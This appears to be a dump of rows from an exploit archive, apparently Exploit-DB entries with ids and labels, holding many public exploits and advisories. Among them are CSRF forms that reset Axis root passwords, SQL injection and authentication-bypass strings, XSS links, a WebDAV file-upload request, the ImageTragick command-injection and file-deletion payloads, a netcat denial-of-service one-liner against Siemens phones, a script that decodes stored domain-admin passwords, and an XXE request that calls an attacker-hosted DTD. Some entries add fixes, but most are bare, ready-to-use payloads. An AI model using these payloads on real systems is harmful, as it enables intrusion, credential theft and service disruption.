Developer's initial response 03/04/09 Findings sent to developer 03/18/09 New version 2.8.7 released, no fix for specific issue! 03/21/09 Public disclosure   Greetings: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke, to all active waraxe.us forum members and to anyone else who know me!   Contact: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  come2waraxe@yahoo.com Janek Vind ""waraxe""  Waraxe forum:  http://www.waraxe.us/forums.html Personal homepage: http://www.janekvind.com/ ---------------------------------- [ EOF ] ------------------------------------  # milw0rm.com [2009-03-23]",.waraxe.,1
41626,"AXIS (Multiple Products) - Cross-Site Request Forgery           0RWELLL4BS           **********        security advisory          olsa-CVE-2015-8255          PGP: 79A6CCC0           @orwelllabs     Advisory Information ==================== - Title: Cross-Site Request Forgery - Vendor: AXIS Communications - Research and Advisory: Orwelllabs - Class: Session Management control [CWE-352] - CVE Name: CVE-2015-8255 - Affected Versions: - IoT Attack Surface: Device Web Interface - OWASP IoTTop10: I1    Technical Details ================= Because of the own (bad) design of this kind of device (Actualy a big problem of IoT, one of them) The embedded web application does not verify whether a valid request was intentionally provided by the user who submitted the request.    PoCs ==== #-> Setting root password to W!nst0n  <html>   <!-- CSRF PoC  Orwelllabs -->   <body>     <form action=""http://xxx.xxx.xxx.xxx/axis-cgi/admin/pwdgrp.cgi"">       <input type=""hidden"" name=""action"" value=""update"" />       <input type=""hidden"" name=""user"" value=""root"" />       <input type=""hidden"" name=""pwd"" value=""w!nst0n"" />       <input type=""hidden"" name=""comment"" value=""Administrator"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   #-> Adding new credential SmithW:W!nst0n  <html>   <!-- CSRF PoC - Orwelllabs -->   <body>     <form action=""http://xxx.xxx.xxx.xxx/axis-cgi/admin/pwdgrp.cgi"">       <input type=""hidden"" name=""action"" value=""add"" />       <input type=""hidden"" name=""user"" value=""SmithW"" />       <input type=""hidden"" name=""sgrp"" value=""viewer&#58;operator&#58;admin&#58;ptz"" />       <input type=""hidden"" name=""pwd"" value=""W!nst0n"" />       <input type=""hidden"" name=""grp"" value=""users"" />       <input type=""hidden"" name=""comment"" value=""WebUser"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   #-> Deleting an app via directly CSRF (axis_update.shtml)  http://xxx.xxx.xxx.xxx/axis-cgi/vaconfig.cgi?action=get&name=<script src="" http://xxx.xxx.xxx.xxx/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml ""></script>   [And many acitions allowed to an user [all of them?] can be forged in this way]   Vendor Information, Solutions and Workarounds +++++++++++++++++++++++++++++++++++++++++++++ Well, this is a very old design problem of this kind of device, nothing new to say about that.   Credits ======= These vulnerabilities has been discovered and published by Orwelllabs.   Legal Notices ============= The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. We accept no responsibility for any damage caused by the use or misuse of this information.   About Orwelllabs ================ https://www.exploit-db.com/author/?a=8225 https://packetstormsecurity.com/files/author/12322/",AXIS,1
15646,"DynPG 4.2.0 - Multiple Vulnerabilities Vulnerability ID: HTB22703 Reference: http://www.htbridge.ch/advisory/lfi_in_dynpg.html Product: DynPG  Vendor: dynpg.org ( http://www.dynpg.org/ )  Vulnerable Version: 4.2.0  Vendor Notification: 16 November 2010  Vulnerability Type: Local File Inclusion Status: Fixed by Vendor Risk level: Medium  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Local File Inclusion: Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in CHG_DYNPG_SET_LANGUAGE variable.  Attacker can use browser to exploit this vulnerability. The following PoC is available:   <form action=""http://dynpg/index.php"" method=""post"" name=""main"" > <input type=""hidden"" name=""SYSTEM_NAME"" value=""[admin_login]"" /> <input type=""hidden"" name=""SYSTEM_PASSWORD"" value=""[admin_password]"" /> <input type=""hidden"" name=""SET_LANGUAGE"" value=""1"" /> <input type=""hidden"" name=""CHG_DYNPG_SET_LANGUAGE"" value=""../../../../../"" /> <input type=""submit"" value=""submit"" name=""submit"" /> </form>   Solution: Upgrade to the most recent version  Path Disclosure: Vulnerability Details: The vulnerability exists due to failure in the ""/languages.inc.php"" script, it's possible to generate an error that will reveal the full path of the script. A remote user can determine the full path to the web root directory and other potentially sensitive information.  Attacker can use browser to exploit this vulnerability. The following PoC is available:   http://[host]/languages.inc.php  Solution: Upgrade to the most recent version  SQL Injection: Vulnerability Details: The vulnerability exists due to failure in the ""_rights.php"" script to properly sanitize user-supplied input in ""giveRights_UserId"" variable. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  Attacker can use browser to exploit this vulnerability. The following PoC is available:   <form action=""http://[host]/_rights.php"" method=""post"" name=""main"" > <input type=""hidden"" name=""saveRights"" value=""1"" /> <input type=""hidden"" name=""giveRights_giveright"" value=""1"" /> <input type=""hidden"" name=""giveRights_UserId"" value=""123'SQL_CODE_HERE"" /> <input type=""submit"" value=""submit"" name=""submit"" /> </form>   Solution: Upgrade to the most recent version",.htbridge.chadvisorylfi_in_dynpg.html,0
41745,"QNAP QTS < 4.2.4 - Domain Privilege Escalation QNAP QTS Domain Privilege Escalation Vulnerability   Name              Sensitive Data Exposure in QNAP QTS  Systems Affected  QNAP QTS (NAS) all model and all versions < 4.2.4  Severity          High 7.9/10  Impact            CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L  Vendor            http://www.qnap.com/  Advisory          http://www.ush.it/team/ush/hack-qnap/qnap.txt  Authors           Pasquale ""sid"" Fiorillo (sid AT ush DOT it)                     Guido ""go"" Oricchio (g.oricchio AT pcego DOT com)  Date              20170322  I. BACKGROUND  QNAP Systems, founded in 2004, provides network attached storage (NAS) and network video recorder (NVR) solutions for home and business use to the global market. QNAP also delivers a cloud service, called myQNAPcloud, that allows users to access and manage the devices from anywhere. QTS is a QNAP devices proprietary firmware based on Linux.  ISGroup (http://www.isgroup.biz/) is an Italian Information Security  boutique, we found this 0day issue while supporting Guido Oricchio  of PCego, a System Integrator, to secure a QNAP product for one of his customer.  Responsible disclosure with Qnap: we contacted qnap on public security@ contact and we escalate fast to their Security Researcher Myron Su on PGP emails.  Prior vulnerabilities in QNAP:  https://www.qnap.com/en/support/con_show.php?op=showone&cid=41  Information to customers of the vulnerability is shown in their bulletin ID NAS-201703-21 (https://www.qnap.com/en/support/con_show.php?cid=113): QTS 4.2.4 Build 20170313 includes security fixes for the following vulnerabilities: Configuration file vulnerability (CVE-2017-5227) reported by Pasquale Fiorillo of the cyber security company ISGroup (www.isgroup.biz), a cyber security company, and Guido Oricchio of PCego (www.pcego.com), a system integrator.  The latest version of the software at the time of writing can be  obtained from:  https://www.qnap.com/en-us/product_x_down/ https://start.qnap.com/en/index.php https://www.qnap.com/  II. DESCRIPTION  The vulnerability allows a local QTS admin user, or other low privileged user, to access configuration file that includes a bad crypted Microsoft Domain Administrator password if the NAS was joined to a Microsoft  Active Directory domain.  The affected component is the ""uLinux.conf"" configuration file,  created with a world-readable permission used to store a Domain  Administrator password.  Admin user can access the file using ssh that is enabled by default. Other users are not allowed to login, so they have to exploit a  component, such as a web application, to run arbitrary command or  arbitrary file read.  TLDR: Anyone is able to read uLinux.conf file, world readable by  default, can escalate to Domain Administrator if a NAS is a domain  member.  III. ANALYSIS  QNAP QTS stores ""uLinux.conf"" configuration file in a directory  accessible by ""nobody"" and with permission that make them readable by  ""nobody"".  If the NAS was joined to an Active Directory, such file contain a Domain Administrator user and password in an easily decrypt format.  In older versions of QTS the Domain Admin's password was stored in plaintext.  A) Config file readable by ""nobody""    [~] # ls -l /etc/config/uLinux.conf    -rw-r--r--    1 admin    administ      7312 Dec 10 06:39 /etc/config/uLinux.conf    Our evidence is for QTS 4.2.0 and QTS 4.2.2 running on a TS-451U,    TS-469L, and TS-221. Access to the needed file are guaranteed to    all the local users, such as httpdusr used to running web sites and    web application hosted on the NAS.    This expose all the information contained in the configuration file at   risk and this is a violation of the principle of least privilege.    https://en.wikipedia.org/wiki/Principle_of_least_privilege  B) Weak encrypted password in the configuration file    The Microsoft Active Directory Admin username and password are stored    in the file obfuscated by a simple XOR cypher and base64 encoded.    In this scenario, a Local File Read vulnerability could lead to full   domain compromise given the fact that an attacker can re-use such   credentials to authenticate against a Domain Controller with maximum   privileges.    The password field in the uLinux.conf has the following format:    User = <username>   Password = <base64>    eg:    User = Administrator   Password = AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw==    The ""<base64>"" decoded is:    sid@zen:~$echo -n ""AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw=="" | base64 -d | hexdump -C   00000000  03 03 00 00 01 01 06 06  07 07 04 04 23 23 20 20  |............##  |   00000010  21 21 26 26 27 27 24 24  43                       |!!&&''$$C|   00000019    Each byte xored with \x62 is the hex ascii code of the plaintext char.   Eg:      \x03 ^ \x62 = \x61 (a)     \x00 ^ \x62 = \x61 (b)     ...     \x24 ^ \x62 = \x46 (F)     \x43 ^ \x62 = \x21 (!)        The plaintext password is: aabbccddeeffAABBCCDDEEFF!  IV. EXPLOIT  The following code can be used to decode the password:  #!/usr/bin/php <?php $plaintext = str_split(base64_decode($argv[1])); foreach($plaintext as $chr) { 	echo chr(ord($chr)^0x62); } echo ""\n"";  Eg: sid@zen:~$ ./decode.php AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw== aabbccddeeffAABBCCDDEEFF!  V. VENDOR RESPONSE Vendor released QTS 4.2.4 Build 20170313 that contains the proper security patch. At the time of this writing an official patch is currently available.  VI. CVE INFORMATION  Mitre assigned the CVE-2017-5227 for this vulnerability, internally to Qnap it's referred as Case NAS-201703-21.  VII. DISCLOSURE TIMELINE  20161212 Bug discovered 20170106 Request for CVE to Mitre 20170106 Disclosure to security@qnap.com 20170107 Escalation to Myron Su, Security Researcher from QNAP (fast!) 20170107 Details disclosure to Myron Su 20170109 Got CVE-CVE-2017-5227 from cve-assign 20170110 Myron Su confirm the vulnerability 20170203 We asks for updates, no release date from vendor 20170215 We extend the disclosure date as 28 Feb will not be met 20170321 QNAP releases the QTS 4.2.4 Build 20170313 20170322 Advisory disclosed to the public  VIII. REFERENCES  [1] Top 10 2013-A6-Sensitive Data Exposure     https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure  [2] Access Control Cheat Sheet     https://www.owasp.org/index.php/Access_Control_Cheat_Sheet  [3] https://forum.qnap.com/viewtopic.php?t=68317     20121213 User reporting that the password was stored in plaintext in     a world-readable file      [4] https://www.qnap.com/en/support/con_show.php?cid=113     Qnap Security Bullettin NAS-201703-21   IX. CREDIT  Pasquale ""sid"" Fiorillo and Guido ""go"" Oricchio are credited with the  discovery of this vulnerability.  Pasquale ""sid"" Fiorillo web site: http://www.pasqualefiorillo.it/ mail: sid AT ush DOT it  Guido ""go"" Oricchio web site: http://www.pcego.com/ mail: g.oricchio AT pcego DOT com  X. LEGAL NOTICES  Copyright (c) 2017 Pasquale ""sid"" Fiorillo  Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission.  Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.",.qnap.,1
44366,"WordPress Plugin Relevanssi 4.0.4 - Reflected Cross-Site Scripting # Exploit Title : Relevanssi Wordpress Search Plugin Reflected Cross Site Scripting (XSS) # Date: 23-03-2018  # Exploit Author : Stefan Broeder # Contact : https://twitter.com/stefanbroeder # Vendor Homepage: https://www.relevanssi.com # Software Link: https://wordpress.org/plugins/relevanssi # Version: 4.0.4 # CVE : CVE-2018-9034 # Category : webapps  Description =========== Relevanssi is a WordPress plugin with more than 100.000 active installations. Version 4.0.4 (and possibly previous versions) are affected by a Reflected XSS vulnerability.  Vulnerable part of code ======================= File: relevanssi/lib/interface.php:1055 displays unescaped value of $_GET variable 'tab'.  .. 1049 if( isset( $_REQUEST[ 'tab' ] ) ) {  1050 $active_tab = $_REQUEST[ 'tab' ];  1051 } // end if  1052 1053 if ($active_tab === ""stopwords"") $display_save_button = false;  1054 1055 echo ""<input type='hidden' name='tab' value='$active_tab' />"";  ..  Impact ====== Arbitrary JavaScript code can be run on browser side if a logged in WordPress administrator is tricked to click on a link or browse a URL under the attacker control. This can potentially lead to creation of new admin users, or remote code execution on the server.  Proof of Concept ============ In order to exploit this vulnerability, the attacker needs to have the victim visit the following link:  /wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+  Please note that quotes and double quotes are properly escaped by WordPress, however javascript escaping (\) is applied while the value is in an HTML attribute. There, escaping a quote by \' has no effect (&quot should be used). This allows us to break out of the HTML attribute and start the script tag. Within the script, quotes are properly escaped but there are ways to obfuscate javascript without requiring these symbols as can be seen in above payload.   Solution ========  Update to version 4.1",.relevanssi.,1
45021,"Cela Link CLR-M20 2.7.1.6 - Arbitrary File Upload # Exploit Title: Cela Link CLR-M20 2.7.1.6 - Arbitrary File Upload # Date: 2018-07-13 # Shodan Dork: CLR-M20 # Exploit Author: Safak Aslan # Software Link: http://www.celalink.com # Version: 2.7.1.6 # CVE: 2018-15137 # Authentication Required: No # Tested on: Windows  # Vulnerability Description # Due to the Via WebDAV (Web Distributed Authoring and Versioning), # on the remote server, Cela Link CLR-M20 allows unauthorized users to upload # any file(e.g. asp, aspx, cfm, html, jhtml, jsp, shtml) which causes # remote code execution as well. # Due to the WebDAV, it is possible to upload the arbitrary # file utilizing the PUT method.  # Proof-of-Concept # Request  PUT /test.html HTTP/1.1 Host: targetIP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,tr-TR;q=0.8,tr;q=0.5,en-US;q=0.3 Accept-Encoding: gzip, deflate Content-Length: 26  the reflection of random numbers 1230123012  # Response  HTTP/1.1 201 Created Content-Length: 0 Date: Fri, 13 Jul 2018 14:38:54 GMT Server: lighttpd/1.4.20  As a result, on the targetIP/test.html, ""the reflection of random numbers 1230123012"" is reflected on the page.",.celalink.,1
8487,"EZ Webitor - Authentication Bypass -------------------------AllaH AkbaR------------------------------- ezwebitor  (Auth Bypass) Remote Sql Injection --------------------------------------------------------------------------- Discovered By: Snakespc     ALGERIAN HaCkEr  Mail: snakespc@gmail.com Site:http://www.snakespc.com/sc/index.php Chi3arona houa :  Serra7 merra7 , koulchi mderra7>>>>              Aflawa Kamikaz Wa4rin Fi kol Bla4s  -------------------------SNAKES TEAM------------------------------------- Script: http://www.ezwebitor.com -------------------------SNAKES TEAM------------------------------------- Exploit: ----------- http://www.ezwebitor.com/demo_standard/ezw/login.php Username:   ' or '1=1 Password:    ' or '1=1 -------------------------SNAKES TEAM------------------------------------- Mr.HCOCA_MAN:::DrEaDFuL:::yassine_enp:::His0k4::: Houssamix:::sunhouse2:::aSSaSSin_HaCkErS::: THE INJECTOR:::ALMADJHOOL:::Th3 g0bL!N::: Dr-HTmL --------------------------SNAKES TEAM------------------------------------ ALL www.SnakespC.com/sc>>>> (  Members ) Str0ke >>>>>>>Milw0rm  # milw0rm.com [2009-04-20]",.snakespc.,1
5450,"Classifieds Caffe - 'cat_id' SQL Injection --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+               Classifieds Caffe (index.php cat_id) Remote SQL Injection            +==-- --==+====================================================================================+==--                      [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]  [+] Info:  [~] Software: Classifieds Caffe [~] Exploit: Remote SQL Injection [High] [~] Where: index.php [~] Bug Found By: JosS [~] Contact: sys-project[at]hotmail.com [~] Web: http://www.spanish-hackers.com  [+] Exploit:  [~] /index.php?action=add&cat_id=[SQL] [~] 7'+union+all+select+0,1,convert(concat(database(),char(58),user(),char(58),version()),char),3/*  --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+                                       JosS                                         +==-- --==+====================================================================================+==--                                        [+] [The End]  # milw0rm.com [2008-04-15]",Classifieds,1
39767,"ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We've reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 http://legacy.imagemagick.org/script/changelog.php), but this fix seems to be incomplete. We are still working with developers.  ImageMagick: Multiple vulnerabilities in image decoder  1. CVE-2016-3714 - Insufficient shell characters filtering leads to (potentially remote) code execution  Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.  ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests: ""wget"" -q -O ""%o"" ""https:%M"" where %M is the actual link from the input. It is possible to pass the value like `https://example.com""|ls ""-la` and execute unexpected 'ls -la'. (wget or curl should be installed)  $ convert 'https://example.com""|ls ""-la' out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...   The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to https://hackerone.com/stewie for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default delegates.xml / policy.xml, may be vulnerable to this issue.  exploit.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg""|ls ""-la)' pop graphic-context  exploit.svg -=-=-=-=-=-=-=-=- <?xml version=""1.0"" standalone=""no""?> <!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd""> <svg width=""640px"" height=""480px"" version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink= ""http://www.w3.org/1999/xlink""> <image xlink:href=""https://example.com/image.jpg""|ls ""-la"" x=""0"" y=""0"" height=""640px"" width=""480px""/> </svg>  $ convert exploit.mvg out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...  ImageMagick tries to guess the type of the file by it's content, so exploitation doesn't depend on the file extension. You can rename exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In addition, ImageMagick's tool 'identify' is also vulnerable, so it can't be used as a protection to filter file by it's content and creates additional attack vectors (e.g. via 'less exploit.jpg', because 'identify' is invoked via lesspipe.sh). Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.  All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.  2. CVE-2016-3718 - SSRF It is possible to make HTTP GET or FTP request:  ssrf.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(http://example.com/)' pop graphic-context  $ convert ssrf.mvg out.png # makes http request to example.com  3. CVE-2016-3715 - File deletion It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:  delete_file.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' popgraphic-context  $ touch /tmp/delete.txt $ convert delete_file.mvg out.png # deletes /tmp/delete.txt  4. CVE-2016-3716 - File moving It is possible to move image files to file with any extension in any folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and image.gif should exist in known location - /tmp/ for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):  file_move.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'msl:/tmp/msl.txt' popgraphic-context  /tmp/msl.txt -=-=-=-=-=-=-=-=- <?xml version=""1.0"" encoding=""UTF-8""?> <image> <read filename=""/tmp/image.gif"" /> <write filename=""/var/www/shell.php"" /> </image>  /tmp/image.gif - image with php shell inside (https://www.secgeek.net/POC/POC.gif for example)  $ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php  5. CVE-2016-3717 - Local file read (independently reported by original research author - https://hackerone.com/stewie) It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:  file_read.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@...c/passwd' pop graphic-context  $ convert file_read.mvg out.png # produces file with text rendered from /etc/passwd   How to mitigate the vulnerability.  Available patches appear to be incomplete. If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one these two things (but preferably both!): 1. Verify that all image files begin with the expected �magic bytes� corresponding to the image file types you support before sending them to ImageMagick for processing. (see FAQ for more info) 2. Use a policy file to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in �/etc/ImageMagick�. This policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL:  <policymap>     <policy domain=""coder"" rights=""none"" pattern=""EPHEMERAL"" />     <policy domain=""coder"" rights=""none"" pattern=""URL"" />     <policy domain=""coder"" rights=""none"" pattern=""HTTPS"" />     <policy domain=""coder"" rights=""none"" pattern=""MVG"" />     <policy domain=""coder"" rights=""none"" pattern=""MSL"" /> </policymap>   Vulnerability Disclosure Timeline: April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team. April, 21 2016 - file read vulnerability patched by My.Com development team April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report April, 30 2016 - code execution vulnerability reported to ImageMagick development team April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix) April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix) May, 1 2016 - ImageMagic informed of the fix bypass May, 2 2016 - limited disclosure to 'distros' mailing list May, 3 2016 - public disclosure at https://imagetragick.com/",imagemagick,1
35223,"Digi Online Examination System 2.0 - Unrestricted Arbitrary File Upload # Exploit Title:  Digi Online Examination System Unrestricted File Upload Vulnerability # Date: 12-10-2014 # Exploit Author: Halil Dalabasmaz # Version: v2.0 # Software Link: http://codecanyon.net/item/digi-online-examination-system-does/8610180 # Software Test Link: http://s1.digitalvidhya.com/doesv2/  # Vulnerabilities Description:  ===Unrestricted File Upload=== You can upload your shell from ""Photo"" section while register the system. And then chekc your shell from here; http://example.com/assets/uploads/images/shellname.php  =Solution= Filter the files aganist to attacks.",Digi,1
7220,"Siemens C450IP/C475IP - Remote Denial of Service Hi,  echo -e ""X sip:s X\nFrom:<sip:@x>\nTo:<sip:@x>\n"" | nc -q0 -u <target> 5060  Will disconnect all current VOIP and PSTN calls and reboot the C450IP/C475IP devices.  Tested with current firmwares.  Vendor (Siemens) was contacted 11/2007, no fix supplied yet.  Have phun!  sky & Any  # milw0rm.com [2008-11-24]",Siemens,1
44134,"Joomla! Component Saxum Numerology 3.0.4 - SQL Injection # # # # #  # Exploit Title: Joomla! Component Saxum Numerology 3.0.4 - SQL Injection # Dork: N/A # Date: 16.02.2018 # Vendor Homepage: http://www.saxum2003.hu/ # Software Link: http://www.saxum2003.hu/en/downloadsen/category/7-saxumnumerology-komponens.html # Software Download: http://www.saxum2003.hu/downloadsen/file/104-numerology3.html?format=html # Version: 3.0.4 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-7177 # # # # #  # Exploit Author: Ihsan Sencan # # # # # #  # POC:  #  # 1) # http://localhost/[PATH]/index.php?option=com_saxumnumerology&view=savedresult&publicid=[SQL] #  # JTMxJTI3JTIwJTQxJTRlJTQ0JTIwJTQ1JTU4JTU0JTUyJTQxJTQzJTU0JTU2JTQxJTRjJTU1JTQ1JTI4JTM2JTM2JTJjJTQzJTRmJTRlJTQzJTQxJTU0JTI4JTMwJTc4JTM1JTYzJTJjJTQzJTRmJTRlJTQzJTQxJTU0JTVmJTU3JTUzJTI4JTMwJTc4JTMyJTMwJTMzJTYxJTMyJTMwJTJjJTU1JTUzJTQ1JTUyJTI4JTI5JTJjJTQ0JTQxJTU0JTQxJTQyJTQxJTUzJTQ1JTI4JTI5JTJjJTU2JTQ1JTUyJTUzJTQ5JTRmJTRlJTI4JTI5JTI5JTJjJTI4JTUzJTQ1JTRjJTQ1JTQzJTU0JTIwJTI4JTQ1JTRjJTU0JTI4JTM2JTM2JTNkJTM2JTM2JTJjJTMxJTI5JTI5JTI5JTI5JTI5JTJkJTJkJTIwJTJk #  # 2) # <html> # <body> # <form action=""http://localhost/[PATH]/index.php?option=com_saxumnumerology&view=interpret"" method=""post""> # <input name=""type_id"" value=""KFNFTEVDVCA2NiBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoQ09OQ0FUX1dTKDB4MjAzYTIwLFVTRVIoKSxEQVRBQkFTRSgpLFZFUlNJT04oKSksKFNFTEVDVCAoRUxUKDY2PTY2LDEpKSksRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlBMVUdJTlMgR1JPVVAgQlkgeClhKQ=="" type=""hidden""> # <input type=""submit"" value=""Ver Ayari""> # </form> # </body> # </html> #  # # # # #",.saxum2003.hu,0
3668,"CodeWand phpBrowse - 'site_path' Remote File Inclusion PhpBrowse ***************** Found by kezzap66345 * ***************** Script: http://www.codewand.org/download/phpBrowse.tar.gz ***************** ERROR: /include/include_stream.inc.php   include($include_path . ""style.inc.php"");     <<< rfi coded   ************************************************************************************** ************************************************************************************** ************************************************************************************** ************************************************************************************** ************************************************************************************** RFI:  http://SITE.com/path/include/include_stream.inc.php?include_path=[SHELL]  ************************************************************************************** ************************************************************************************** ************************************************************************************** ************************************************************************************** ************************************************************************************** kezzap66345[at]hotmail[dot]com  ******thanx=x0r0n*str0ke*shika***Siircicocuk*******************************************  # milw0rm.com [2007-04-05]",.codewand.,1
45027,"Fortify Software Security Center (SSC) 17.x/18.1 - XML External Entity Injection Details ================ Software: Fortify SSC (Software Security Center)  Version: 17.10, 17.20 & 18.10 Homepage: https://www.microfocus.com Advisory report: https://github.com/alt3kx/CVE-2018-12463 CVE: CVE-2018-12463 at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12463 CVSS: HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L) CWE-611, CWE-918  Description ================ Out-of-Band XML External Entity (OOB-XXE) An XML External Entity attack is a type of attack against an application that parses XML input.   This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.  Vulnerability ================ XML external entity (XXE) vulnerability in /ssc/fm-ws/services in Fortify Software Security Center (SSC) 17.10, 17.20 & 18.10 allows remote unauthenticated users to read arbitrary files or conduct server-side request forgery (SSRF) attacks via a crafted DTD in an XML request.  Proof of concept Exploit ==========================  The offending POST method below:  POST /ssc/fm-ws/services HTTP/1.1 Accept-Encoding: gzip, deflate SOAPAction: """" Accept: text/xml Content-Type: text/xml; charset=UTF-8; text/html; Cache-Control: no-cache Pragma: no-cache User-Agent: Java/1.8.0_121 Host: fortifyserver.com Connection: close Content-Length: 1765  <?xml version='1.0' encoding='UTF-8'?> <!Your payload here ""http://intuder.IP.here/alex1.dtd""> <-- HERE!!!  <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"">   <soapenv:Header>     <wsse:Security xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"" soapenv:mustUnderstand=""1"">       <wsu:Timestamp xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" wsu:Id=""Timestamp-2"">         <wsu:Created>2018-05-24T14:27:02.619Z</wsu:Created>         <wsu:Expires>2018-05-24T14:32:02.619Z</wsu:Expires>       </wsu:Timestamp>       <wsse:UsernameToken xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" wsu:Id=""UsernameToken-1"">         <wsse:Username>XXXXXXX</wsse:Username>         <wsse:Password Type=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText"">XXXXXXXXXXX</wsse:Password>       </wsse:UsernameToken>     </wsse:Security>   </soapenv:Header>   <soapenv:Body>     <ns3:GetAuthenticationTokenRequest xmlns:ns3=""http://www.fortify.com/schema/fws"" xmlns:ns6=""xmlns://www.fortify.com/schema/issuemanagement""  xmlns:ns5=""xmlns://www.fortifysoftware.com/schema/activitytemplate"" xmlns:ns8=""xmlns://www.fortifysoftware.com/schema/seed""  